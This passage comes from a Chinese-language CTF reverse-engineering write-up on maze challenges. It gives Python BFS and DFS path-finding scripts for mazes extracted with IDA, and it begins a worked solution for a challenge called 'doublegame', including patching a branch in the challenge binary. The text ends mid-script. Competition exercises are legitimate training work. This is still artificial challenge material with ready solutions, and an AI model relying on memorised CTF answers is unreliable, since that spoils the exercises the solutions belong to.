1,   1,   0,   1,   1,   1,<br>    1,   0,   0,   0,   0,   1,   1,   0,   0,   0,<br>    0,   1,   0,   0,   0,   1,   1,   1,   1,   1,<br>    0,   1,   1,   1,   1,   0,   1,   1,   0,   1,<br>    0,   1,   1,   1,   1,   1,   0,   1,   1,   1,<br>    1,   0,   1,   1,   0,   1,   0,   1,   1,   0,<br>    0,   0,   0,   1,   1,   1,   1,   0,   1,   1,<br>    0,   1,   0,   0,   1,   0,   1,   1,   1,   1,<br>    1,   1,   1,   0,   0,   0,   0,   1,   1,   1,<br>    1,   0,   1,   1,   1,   1,   1,   1,   1,   1,<br>    1,   1,   1,   1,   1,   1<br>]<br>s = 0  # s用作索引访问str, 供下面tmp列表取值<br><br># 分析题目后设置迷宫的行列<br>row = 16 # 设置二维迷宫行数 input（）<br>col = 16 # 设置二维迷宫列数 input（）<br><br>maze = []<br>for i in range(row):<br>    tmp = []<br>    for j in range(col):<br>        tmp.append(str[s])<br>        s += 1<br>    maze.append(tmp)  # 凑一行添加一行到迷宫中<br>print(maze)<br># 设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可<br>path_len = 54+1  # 如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度并+1，<br>#否则请保留path_len的极大值 0x7fffffff<br><br><br># 进行BFS寻找路径<br>def bfs(start, end, barrier):<br>    directions = [(0, 1), (1, 0), (0, -1), (-1, 0)]  # 定义四个方向的移动<br>    for i in range(len(maze)):  # 获取起点和终点在列表中的索引<br>        for j in range(len(maze[i])):<br>            if (maze[i][j] == start):<br>                start = (i, j)<br>            if (maze[i][j] == end):<br>                end = (i, j)<br>    # 以下均是bfs算法套路<br>    queue = deque()<br>    queue.append((start, [start]))  # (当前位置, 路径)<br>    visited = set()<br>    visited.add(start)<br>    while queue:<br>        position, path = queue.popleft()<br>        if position == end:<br>            return path<br>        elif len(path) == path_len:<br>            return path<br>        for d in directions:<br>            next_position = (position[0] + d[0], position[1] + d[1])<br>            if 0 &lt;= next_position[0] &lt; len(maze) and 0 &lt;= next_position[1] &lt; len(maze[0]) and \<br>                    maze[next_position[0]][next_position[1]] != barrier and next_position not in visited:<br>                queue.append((next_position, path + [next_position]))<br>                visited.add(next_position)<br>    return None<br><br><br># 执行BFS搜索并打印结果<br>if __name__ == &#x27;__main__&#x27;:<br>    # maze[起点x坐标][起点y坐标] = &#x27;S&#x27; <br>    #如果题目给了起点终点的坐标，<br>    #在这里直接给起点和终点添加特征<br>    # maze[终点x坐标][终点y坐标] = &#x27;E&#x27;<br>    maze[15][1]=&#x27;S&#x27;<br>    path = bfs(&#x27;S&#x27;, &#x27;E&#x27;, 1)  # bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如&#x27;#&#x27;)<br>    print(&quot;移动路径坐标：&quot;, path)<br>    print(&quot;移动路径方位：&quot;, end=&#x27;&#x27;)<br>    for i in range(1, len(path)):<br>        x1, y1, x2, y2 = path[i - 1][0], path[i - 1][1], path[i][0], path[i][1]<br>        if (x1 &gt; x2):  # 上<br>            print(&quot;w&quot;, end=&#x27;&#x27;)<br>        elif (x1 &lt; x2):  # 下<br>            print(&quot;s&quot;, end=&#x27;&#x27;)<br>        elif (y1 &gt; y2):  # 左<br>            print(&quot;a&quot;, end=&#x27;&#x27;)<br>        elif (y1 &lt; y2):  # 右<br>            print(&quot;d&quot;, end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="1）"><a href="#1）" class="headerlink" title="1）"></a>1）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plain"># str为ida中使用快捷键[shift+e]提取到的数据, 如果提取的是string literal则加上引号视作字符串，如果是C array(decimal)则加上中括号视作列表<br>str = [<br><br>    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,<br>    1,   1,   1,   1,   1,   1,   1,   0,   0,   0,<br>    0,   0,   1,   1,   1,   1,   1,   1,   0,   1,<br>    1,   1,   1,   0,   1,   1,   1,   0,   1,   1,<br>    1,   1,   1,   1,   0,   1,   1,   1,   1,   0,<br>    1,   1,   1,   0,   1,   1,   0,   0,   0,   1,<br>    0,   1,   1,   1,   1,   0,   1,   1,   1,   0,<br>    1,   1,   0,   1,   0,   1,   0,   1,   1,   1,<br>    1,   0,   1,   1,   1,   0,   0,   0,   0,   1,<br>    0,   1,   0,   1,   1,   1,   1,   0,   1,   1,<br>    1,   1,   1,   1,   0,   1,   0,   1,   0,   1,<br>    1,   1,   1,   0,   1,   1,   1,   1,   1,   1,<br>    0,   0,   0,   1,   0,   1,   1,   1,   1,   0,<br>    1,   1,   1,   1,   1,   1,   1,   0,   1,   1,<br>    0,   1,   1,   1,   1,   0,   1,   1,   1,   1,<br>    1,   1,   1,   0,   1,   1,   0,   1,   1,   1,<br>    1,   0,   0,   0,   0,   1,   1,   0,   0,   0,<br>    0,   1,   0,   0,   0,   1,   1,   1,   1,   1,<br>    0,   1,   1,   1,   1,   0,   1,   1,   0,   1,<br>    0,   1,   1,   1,   1,   1,   0,   1,   1,   1,<br>    1,   0,   1,   1,   0,   1,   0,   1,   1,   0,<br>    0,   0,   0,   1,   1,   1,   1,   0,   1,   1,<br>    0,   1,   0,   0,   1,   0,   1,   1,   1,   1,<br>    1,   1,   1,   0,   0,   0,   0,   1,   1,   1,<br>    1,   0,   1,   1,   1,   1,   1,   1,   1,   1,<br>    1,   1,   1,   1,   1,   1<br>]#待输入的迷宫数组<br>s = 0  # s用作索引访问str, 供下面tmp列表取值<br><br># 分析题目后设置迷宫的行列<br>row = 16 # 设置二维迷宫行数<br>col = 16 # 设置二维迷宫列数<br><br>maze = []<br>for i in range(row):<br>    tmp = []<br>    for j in range(col):<br>        tmp.append(str[s])<br>        s += 1<br>    maze.append(tmp)  # 凑一行添加一行到迷宫中<br>print(maze)<br></code></pre></td></tr></table></figure><h2 id="2）"><a href="#2）" class="headerlink" title="2）"></a>2）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-comment"># 设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可</span><br>maze = [] <span class="hljs-comment">#二维列表迷宫，直接输入脚本1的二维数组</span><br>path_len = <span class="hljs-number">0x7fffffff</span>  <span class="hljs-comment"># 如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度，否则请保留path_len的极大值</span><br><br><br><span class="hljs-comment"># 进行BFS寻找路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bfs</span>(<span class="hljs-params">start, end, barrier</span>):<br>    directions = [(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)]  <span class="hljs-comment"># 定义四个方向的移动</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(maze)):  <span class="hljs-comment"># 获取起点和终点在列表中的索引</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(maze[i])):<br>            <span class="hljs-keyword">if</span> (maze[i][j] == start):<br>                start = (i, j)<br>            <span class="hljs-keyword">if</span> (maze[i][j] == end):<br>                end = (i, j)<br>    <span class="hljs-comment"># 以下均是bfs算法套路</span><br>    queue = deque()<br>    queue.append((start, [start]))  <span class="hljs-comment"># (当前位置, 路径)</span><br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start)<br>    <span class="hljs-keyword">while</span> queue:<br>        position, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> position == end:<br>            <span class="hljs-keyword">return</span> path<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(path) == path_len:<br>            <span class="hljs-keyword">return</span> path<br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> directions:<br>            next_position = (position[<span class="hljs-number">0</span>] + d[<span class="hljs-number">0</span>], position[<span class="hljs-number">1</span>] + d[<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= next_position[<span class="hljs-number">0</span>] &lt; <span class="hljs-built_in">len</span>(maze) <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= next_position[<span class="hljs-number">1</span>] &lt; <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> \<br>            maze[next_position[<span class="hljs-number">0</span>]][next_position[<span class="hljs-number">1</span>]] != barrier <span class="hljs-keyword">and</span> next_position <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                queue.append((next_position, path + [next_position]))<br>                visited.add(next_position)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 执行BFS搜索并打印结果</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># maze[起点x坐标][起点y坐标] = &#x27;S&#x27; </span><br>    <span class="hljs-comment">#如果题目给了起点终点的坐标，在这里直接给起点和终点添加特征</span><br>    <span class="hljs-comment"># maze[终点x坐标][终点y坐标] = &#x27;E&#x27;</span><br>    <br>    path = bfs(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如&#x27;#&#x27;)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;移动路径坐标：&quot;</span>, path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;移动路径方位：&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(path)):<br>        x1, y1, x2, y2 = path[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], path[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>], path[i][<span class="hljs-number">0</span>], path[i][<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> (x1 &gt; x2):  <span class="hljs-comment"># 上</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;w&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (x1 &lt; x2):  <span class="hljs-comment"># 下</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (y1 &gt; y2):  <span class="hljs-comment"># 左</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (y1 &lt; y2):  <span class="hljs-comment"># 右</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><font style="color:#DF2A3F;">wsad可以根据题目要求更改键位</font></p><h2 id="3）"><a href="#3）" class="headerlink" title="3）"></a>3）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs plain">maze = [<br> [<br>  1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1],<br> [<br>  1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],<br> [<br>  1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1],<br> [<br>  1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],<br> [<br>  1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1],<br> [<br>  1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1],<br> [<br>  1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],<br> [<br>  1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1],<br> [<br>  1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1],<br> [<br>  1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]]<br>usedmap=[[0 for i in range(len(maze))]for i in range(len(maze[0]))]<br>sti=0<br>stj=1<br>edi=24<br>edj=23<br>flag=&#x27;&#x27;<br>def dfs(x,y):<br>    global flag<br>    if x==edi and y==edj:<br>        print(flag)<br>        return<br>    if maze[x+1][y]==0 and usedmap[x+1][y]==0:<br>        usedmap[x][y]=1<br>        flag+=&#x27;s&#x27;<br>        dfs(x+1,y)<br>        flag=flag[:-1]<br>        usedmap[x][y]=0<br>    if maze[x-1][y]==0 and usedmap[x-1][y]==0:<br>        usedmap[x][y]=1<br>        flag+=&#x27;w&#x27;<br>        dfs(x-1,y)<br>        flag=flag[:-1]<br>        usedmap[x][y]=0<br>    if maze[x][y+1]==0 and usedmap[x][y+1]==0:<br>        usedmap[x][y]=1<br>        flag+=&#x27;d&#x27;<br>        dfs(x,y+1)<br>        flag=flag[:-1]<br>        usedmap[x][y]=0<br>    if maze[x][y-1]==0 and usedmap[x][y-1]==0:<br>        usedmap[x][y]=1<br>        flag+=&#x27;a&#x27;<br>        dfs(x,y-1)<br>        flag=flag[:-1]<br>        usedmap[x][y]=0<br>dfs(sti,stj)<br>&#x27;&#x27;&#x27;<br>for i in range(len(maze)):<br>    for j in range(len(maze[0])):<br>        print(maze[i][j],end=&#x27;&#x27;)<br>    print()<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><h1 id="例题3-doublegame"><a href="#例题3-doublegame" class="headerlink" title="例题3 doublegame"></a>例题3 doublegame</h1><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722242072121-514173b5-a127-4f85-91fa-52129b918f90-978523.png" alt="1722242072121-514173b5-a127-4f85-91fa-52129b918f90.png"></p><p>运行</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722242096451-7bae7aa6-269c-4701-859a-9bf8c435ee54-283612.png" alt="1722242096451-7bae7aa6-269c-4701-859a-9bf8c435ee54.png"></p><p>ctrl F搜索gameover出现的地方，然后x查找调用函数</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722242173880-9f1c79a7-1f70-4f35-8706-f6d4ee27499f-020436.png" alt="1722242173880-9f1c79a7-1f70-4f35-8706-f6d4ee27499f.png"></p><h2 id="（key非预期）发现有个可疑的数据，是key-13371337"><a href="#（key非预期）发现有个可疑的数据，是key-13371337" class="headerlink" title="（key非预期）发现有个可疑的数据，是key&#x3D;13371337"></a>（key非预期）发现有个可疑的数据，是key&#x3D;13371337</h2><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722242151448-a1d6ea37-e848-4e45-8a93-21014039a4b5-576710.png" alt="1722242151448-a1d6ea37-e848-4e45-8a93-21014039a4b5.png"></p><h2 id="key正常"><a href="#key正常" class="headerlink" title="key正常"></a>key正常</h2><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722245506015-581550ac-dbac-4933-8619-58cde96fbd6d-489526.png" alt="1722245506015-581550ac-dbac-4933-8619-58cde96fbd6d.png"></p><p>发现key ^0x1DC4&#x3D;13376013</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722245419058-b0588599-cd50-4ceb-b3b0-2a097b6faff0-441098.png" alt="1722245419058-b0588599-cd50-4ceb-b3b0-2a097b6faff0.png"></p><p> 静态分析发现，sub_14001136B函数是第二关，将去第二关路上的 if的字节码全部修改为相反的， 然后patch，重新调试  <font style="color:#DF2A3F;">（记得备份）</font></p><p>或者找到迷宫，</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722243985629-a34c7275-0cfd-4e95-9704-018fccdc19d7-602611.png" alt="1722243985629-a34c7275-0cfd-4e95-9704-018fccdc19d7.png"></p><p>先拿出迷宫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">maze=&#x27;&#x27;&#x27; strcpy(Buffer, &quot;000000000000000000000&quot;);<br>  strcpy(v4, &quot;0 0 0 0     0     0 0&quot;);<br>  strcpy(&amp;v4[22], &quot;0 0 0 00000 00000 0 0&quot;);<br>  strcpy(v5, &quot;0 0               0 0&quot;);<br>  strcpy(&amp;v5[22], &quot;0 000 000 0 000 0 0 0&quot;);<br>  strcpy(v6, &quot;0 0     0 0 0   0 0 0&quot;);<br>  strcpy(&amp;v6[22], &quot;0 0 0 00000 000 000 0&quot;);<br>  strcpy(v7, &quot;0 0 0     0   0 0    &quot;);<br>  strcpy(&amp;v7[22], &quot;0 000 0 0 000 0 0 0 0&quot;);<br>  strcpy(v8, &quot;0     0 0 0 0 0 0 0 0&quot;);<br>  strcpy(&amp;v8[22], &quot;0 00000 000 000 0 0 0&quot;);<br>  strcpy(v9, &quot;0     0       0   0 0&quot;);<br>  strcpy(&amp;v9[22], &quot;000 0 0 0 000 0 0 0 0&quot;);<br>  strcpy(v10, &quot;0 0 0 0 0 0 * 0 0 0 0&quot;);<br>  strcpy(&amp;v10[22], &quot;0 0000000 0 000 00000&quot;);<br>  strcpy(v11, &quot;@   0   0 0         0&quot;);<br>  strcpy(&amp;v11[22], &quot;0 0 0 0 0 00000000000&quot;);<br>  strcpy(v12, &quot;0 0 0 0             0&quot;);<br>  strcpy(&amp;v12[22], &quot;000 0 00000 0 000 000&quot;);<br>  strcpy(v13, &quot;0         0 0   0   0&quot;);<br>  strcpy(&amp;v13[22], &quot;000000000000000000000&quot;);&#x27;&#x27;&#x27;<br>maze=[(i[-24:-3]) for i in maze.split(&#x27;\n&#x27;)]<br>for i in maze:<br>    print(i)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722244218163-08dabf4d-3780-49fb-93dc-32b77155a0fd-149049.png" alt="1722244218163-08dabf4d-3780-49fb-93dc-32b77155a0fd.png"></p><p>然后运行脚本</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs plain">maze=&#x27;&#x27;&#x27; strcpy(Buffer, &quot;000000000000000000000&quot;);<br>  strcpy(v4, &quot;0 0 0 0     0     0 0&quot;);<br>  strcpy(&amp;v4[22], &quot;0 0 0 00000 00000 0 0&quot;);<br>  strcpy(v5, &quot;0 0               0 0&quot;);<br>  strcpy(&amp;v5[22], &quot;0 000 000 0 000 0 0 0&quot;);<br>  strcpy(v6, &quot;0 0     0 0 0   0 0 0&quot;);<br>  strcpy(&amp;v6[22], &quot;0 0 0 00000 000 000 0&quot;);<br>  strcpy(v7, &quot;0 0 0     0   0 0    &quot;);<br>  strcpy(&amp;v7[22], &quot;0 000 0 0 000 0 0 0 0&quot;);<br>  strcpy(v8, &quot;0     0 0 0 0 0 0 0 0&quot;);<br>  strcpy(&amp;v8[22], &quot;0 00000 000 000 0 0 0&quot;);<br>  strcpy(v9, &quot;0     0       0   0 0&quot;);<br>  strcpy(&amp;v9[22], &quot;000 0 0 0 000 0 0 0 0&quot;);<br>  strcpy(v10, &quot;0 0 0 0 0 0 * 0 0 0 0&quot;);<br>  strcpy(&amp;v10[22], &quot;0 0000000 0 000 00000&quot;);<br>  strcpy(v11, &quot;@   0   0 0         0&quot;);<br>  strcpy(&amp;v11[22], &quot;0 0 0 0 0 00000000000&quot;);<br>  strcpy(v12, &quot;0 0 0 0             0&quot;);<br>  strcpy(&amp;v12[22], &quot;000 0 00000 0 